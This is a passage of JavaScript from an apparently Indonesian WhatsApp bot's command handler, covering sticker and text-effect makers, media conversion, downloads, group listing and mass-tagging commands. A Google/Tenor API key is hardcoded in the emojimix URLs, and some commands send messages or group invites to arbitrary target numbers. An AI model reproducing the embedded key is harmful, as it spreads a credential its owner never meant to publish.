if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await haikal.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'emojimix2': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Example : ${prefix + command} 😅`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await haikal.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'smeme':
if (!q) return reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (isImage) return reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
reply(mess.wait)
mee = await haikal.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${q}.png?background=${mem}`)
haikal.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
break
//==============================================*===//
case 'toimage': case 'toimg': {
if (!isCreator) return m.reply(mess.owner)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
haikal.sendMessage(from, { image: buffer }, { quoted:m })
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'tomp4': case 'tovideo': {
if (!isCreator) return m.reply(mess.owner)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
let { webp2mp4File } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await haikal.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted:m })
await fs.unlinkSync(media)
}
break
//=================================================//
case 'toaud': case 'toaudio': {
if (!isCreator) return m.reply(mess.owner)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./baseikal/lib/converter')
let audio = await toAudio(media, 'mp4')
haikal.sendMessage(from, {audio: audio, mimetype: 'audio/mpeg'}, { quoted:m })
}
break
//=================================================//
case 'tovn': case 'toptt': {
if (!isCreator) return m.reply(mess.owner)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
m.reply('Sabar Cuy Loading')
let media = await quoted.download()
let { toPTT } = require('./baseikal/lib/converter')
let audio = await toPTT(media, 'mp4')
haikal.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
}
break
//=================================================//
case 'togif': {
if (!isCreator) return m.reply(mess.owner)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
 let { webp2mp4File } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await haikal.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted:m })
await fs.unlinkSync(media)
}
break
//=================================================//
case 'tourl': {
if (!isCreator) return m.reply(mess.owner)
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./baseikal/lib/uploader')
let media = await haikal.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
case 'pinterest': {
if (!isCreator) return m.reply(mess.owner)
let { pinterest } = require('./baseikal/lib/scraper')
anu = await pinterest(text)
result = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(from, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted:m })
}
break
//=================================================//
case 'couple': {
if (!isCreator) return m.reply(mess.owner)
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
haikal.sendMessage(from, { image: { url: random.male }, caption: `Couple Male` }, { quoted:m })
haikal.sendMessage(from, { image: { url: random.female }, caption: `Couple Female` }, { quoted:m })
}
break
case 'coffe': case 'kopi': {
if (!isCreator) return m.reply(mess.owner)
const ko = {
image: { url: 'https://coffee.alexflipnote.dev/random' },
caption: `☕ Random Coffe`
}
haikal.sendMessage(from, ko, { quoted:m })
}
break
case 'getname': {
if (!isCreator) return m.reply(mess.owner)
if (qtod === "true") {
namenye = await haikal.getName(m.quoted.sender)
m.reply(namenye)
} else if (qtod === "false") {
haikal.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
}
}
break
//=================================================//
case 'getpic': {
if (!isCreator) return m.reply(mess.owner)
if (qtod === "true") {
try {
pporg = await haikal.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
haikal.sendMessage(from, { image : { url : pporg }, caption:`Done` }, { quoted:m })
} else if (qtod === "false") {
try {
pporgs = await haikal.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
haikal.sendMessage(from, { image : { url : pporgs }, caption:`Done` }, { quoted:m })
}
}
break
case 'infochat': {
if (!isCreator) return m.reply(mess.owner)
if (!m.quoted) m.reply('Reply Pesan')
let msg = await m.getQuotedObj()
if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
let teks = ''
for (let i of msg.userReceipt) {
let read = i.readTimestamp
let unread = i.receiptTimestamp
let waktu = read ? read : unread
teks += `⭔ @${i.userJid.split('@')[0]}\n`
teks += ` ┗━⭔ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
}
haikal.sendTextWithMentions(from, teks, m)
}
break
case 'penjara':
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply(`*Contoh* :\n#penjara Haikal [ Lu Sambil Replay Si nmr Target `)
let cret = await haikal.groupCreate(args.join(" "), [])
let response = await haikal.groupInviteCode(cret.id)
haikal.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { text: `「 *Create Group* 」

_▸ Owner : ${botname}
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_https://chat.whatsapp.com/${response}
`, m})

break
case 'play': case 'ytplay': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw `Example : ${prefix + command} story wa anime`
let yts = require("yt-search")
let search = await yts(text)
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
let buttons = [
{buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '► Video'}, type: 1},
{buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: '► Audio'}, type: 1}
]
let buttonMessage = {
image: { url: anu.thumbnail },
caption: `
⭔ Title : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duration : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Upload At : ${anu.ago}
⭔ Author : ${anu.author.name}
⭔ Channel : ${anu.author.url}
⭔ Description : ${anu.description}
⭔ Url : ${anu.url}`,
footer: haikal.user.name,
buttons: buttons,
headerType: 4
}
haikal.sendMessage(from, buttonMessage, { quoted: m })
}
break
case "ytmp4":{
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply('Masukan Link Nya!!!')
m.reply('Sabar Cuy Loading')
downloadMp4(text)
}
break
case "ytmp3":{
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply('Masukan Link Nya!!!')
m.reply('Sabar Cuy Loading')
downloadMp3(text)
}
break
//=================================================//
case 'mediafire': {
if (!isCreator) return m.reply(mess.owner)
if (!text) throw '*Link Nyq Coy*'
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw '*Link Erorr*'
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 100) return m.reply('*File Over Limit* '+util.format(baby1))
const result4 = `*DOWNLOAD MEDIAFIRE*

*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Mime* : ${baby1[0].mime}
*Link* : ${baby1[0].link}\n
_whoa wait hwmods processing..._

*Xyrvzaa*`
m.reply(`${result4}`)
haikal.sendMessage(from, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => m.reply('*Failed to download File*'))
}
break
//=================================================//
case 'warning': {
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
haikal.sendMessage(from, { text : `Harap segera melakukan topup saldo untuk renew/perpanjang server di panel amgeekz.site, 1-3 hari apabila server tidak di perpanjang akan langsung di hapus oleh admin` , mentions: participants.map(a => a.id)}, { quoted:m })
}
break



case 'candy': 
case 'christmas': 
case '3dchristmas': 
case 'sparklechristmas':
case 'deepsea': 
case 'scifi': 
case 'rainbow': 
case 'waterpipe': 
case 'spooky': 
case 'pencil': 
case 'circuit': 
case 'discovery': 
case 'metalic': 
case 'fiction': 
case 'demon': 
case 'transformer': 
case 'berry': 
case 'thunder': 
case 'magma': 
case '3dstone': 
case 'neonlight': 
case 'glitch': 
case 'harrypotter': 
case 'brokenglass':
case 'papercut': 
case 'watercolor':
case 'multicolor': 
case 'neondevil': 
case 'underwater': 
case 'graffitibike':
 case 'snow': 
 case 'cloud': 
 case 'honey': 
 case 'ice': 
 case 'fruitjuice': 
 case 'biscuit': 
 case 'wood': 
case 'chocolate': 
case 'strawberry': 
case 'matrix': 
case 'blood': 
case 'dropwater': 
case 'toxic': 
case 'lava': 
case 'rock': 
case 'bloodglas': 
case 'hallowen': 
case 'darkgold': 
case 'joker': 
case 'wicker':
 case 'firework': 
 case 'skeleton': 
 case 'blackpink': 
 case 'sand': 
 case 'glue': 
 case '1917': 
 case 'leaves': {
   if (!q) return m.reply(`Contoh : ${prefix + command} ${botname}`) 
m.reply('Sabar Cuy Loading')
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
let anu = await maker.textpro(link, q)
haikal.sendMessage(from, { image: { url: anu }, caption: `*© Created By ${botname}*` }, { quoted: m })
}
sticSukses(from)
break
//=================================================//
case 'transformer': case 'fomer': case 'trans':
 if(!q) return m.reply(`Penggunaan ${command} teks`)
 m.reply('Sabar Cuy Loading')
 maker.textpro("https://textpro.me/create-a-transformer-text-effect-online-1035.html", [
`${q}`,])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));

sticSukses(from)
break
//=================================================//
case 'herryp': case 'potter': case 'heryy':
if(!q) return m.reply(`Penggunaan ${command} teks|teks`)
m.reply('Sabar Cuy Loading')
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
 `${teks1}`,`${teks2}`])
 .then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
 .catch((err) => console.log(err));
 
 sticSukses(from)
break
//=================================================//
case 'neondevil': case 'neon': case 'devil':
 if(!q) return m.reply(`Penggunaan ${command} teks`)
 m.reply('Sabar Cuy Loading')
 maker.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html", [
`${q}`,])
 .then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
 .catch((err) => console.log(err));
 
 sticSukses(from)
break
//=================================================//
case '3dstone': case 'stone':
if(!q) return m.reply(`Penggunaan ${command} teks`)
m.reply('Sabar Cuy Loading')
maker.textpro("https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html", [
 `${q}`,])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'thunder': case 'thun':
if(!q) return m.reply(`Penggunaan ${command} teks`)
m.reply('Sabar Cuy Loading')
maker.textpro("https://textpro.me/online-thunder-text-effect-generator-1031.html", [
 `${q}`,])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'graf':
case 'graffiti':
case 'grafiti':
if(!q) return m.reply(`Penggunaan ${command} teks|teks`)
m.reply('Sabar Cuy Loading')
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html", [
 `${teks1}`,`${teks2}`])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'glitch3':
if(!q) return m.reply(`Penggunaan ${command} teks|teks`)
m.reply('Sabar Cuy Loading')
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
 `${teks1}`,`${teks2}`])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case '3dbox':
if(!q) return m.reply(`Penggunaan ${command} teks`)
m.reply('Sabar Cuy Loading')
maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [
 `${q}`,])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'drapwater': case 'water':
if(!q) return m.reply(`Penggunaan ${command} teks`)
m.reply('Sabar Cuy Loading')
 maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
`${q}`,])
 .then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
 .catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'lion2': case 'lionn':
if(!q) return m.reply(`Penggunaan ${command} teks`)
m.reply('Sabar Cuy Loading')
maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
 `${q}`,])
.then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'papercut': case 'paper': case 'cute':
 if(!q) return m.reply(`Penggunaan ${command} teks`)
 m.reply('Sabar Cuy Loading')
 maker.textpro("https://textpro.me/create-art-paper-cut-text-effect-online-1022.html", [
`${q}`,])
 .then((data) => haikal.sendMessage(from, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
 .catch((err) => console.log(err));
 sticSukses(from)
break
//=================================================//
//=================================================//
case 'q': case 'quoted': {
if (!isCreator) return m.reply(mess.owner)
if (!m.quoted) return m.reply('Reply Pesannya!!')
let wokwol = await haikal.serializeM(await m.getQuotedObj())
if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
await wokwol.quoted.copyNForward(from, true)
}
break
//=================================================//
case 'listpc': {
if (!isCreator) return m.reply(mess.owner)
 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
 for (let i of anu) {
 let nama = store.messages[i].array[0].pushName
 teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
 }
 haikal.sendTextWithMentions(from, teks, m)
 }
 break
//=================================================//
case 'listgc': {
if (!isCreator) return m.reply(mess.owner)
 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
 for (let i of anu) {
 let metadata = await haikal.groupMetadata(i)
 teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
 }
 haikal.sendTextWithMentions(from, teks, m)
 }
 break
//=================================================//
 case 'listonline': case 'liston': {
 if (!isCreator) return m.reply(mess.owner)
    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(store.presences[id]), botNumber]
haikal.sendText(from, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
 }
 break
case 'delete': case 'del': {
if (!isCreator) return m.reply(mess.owner)
if (!m.quoted) throw false
let { chat, fromMe, id, isBaileys } = m.quoted
if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
haikal.sendMessage(from, { delete: { remoteJid: from, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
break
case 'sendlinkgc': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281717802873`)
bnnd = text.split("|")[0]+'@s.whatsapp.net'
let response = await haikal.groupInviteCode(from)
haikal.sendText(bnnd, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
sticSukses(from)
}
break

case 'linkgroup': case 'linkgc': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
let response = await haikal.groupInviteCode(from)
haikal.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break

case 'resetlinkgc':
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isBotAdmins) return m.reply('Bot Bukan Admin Cuy')
haikal.groupRevokeInvite(from)
break
//=================================================//
case 'tagall': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
haikal.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted:m })
}
break
//=================================================//
case 'hidetag': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
haikal.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted:m })
}
break
//=================================================//
case 'style': case 'styletext': {
global.db.data.users[m.sender].limit -= 1 // -1 limit
let { styletext } = require('./baseikal/lib/scraper')
if (!text) throw 'Masukkan Query text!'
let anu = await styletext(text)
let teks = `Srtle Text From ${text}\n\n`
for (let i of anu) {
teks += `⭔ *${i.name}* : ${i.result}\n\n`
}
m.reply(teks)
}
break
case '*': {
if (!text) throw `Contoh : ${prefix + command} Haikal`
let teks = `${q}`
{
haikal.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { text : `${teks}`},{ quoted:m })
}
}
break
//=================================================//
 case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
haikalgans = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await haikal.sendMessage(from, { audio: haikalgans, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
//=================================================//
       case 'group': case 'grup': {       
       
if (!m.isGroup) return m.reply('Buat Di Group Bodoh')
if (!isAdmins) return m.reply('Lah Dikira Admin Group Kali')
if (args[0] === 'close'){
    await haikal.groupSettingUpdate(from, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
    await haikal.groupSettingUpdate(from, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
let buttons = [
{ buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
{ buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
    ]
    await haikal.sendButtonText(from, buttons, `Mode Group`, haikal.user.name, m)

     }
    }
    break
//=================================================//
    case 'editinfo': {
    if (!isCreator) return m.reply(mess.owner)
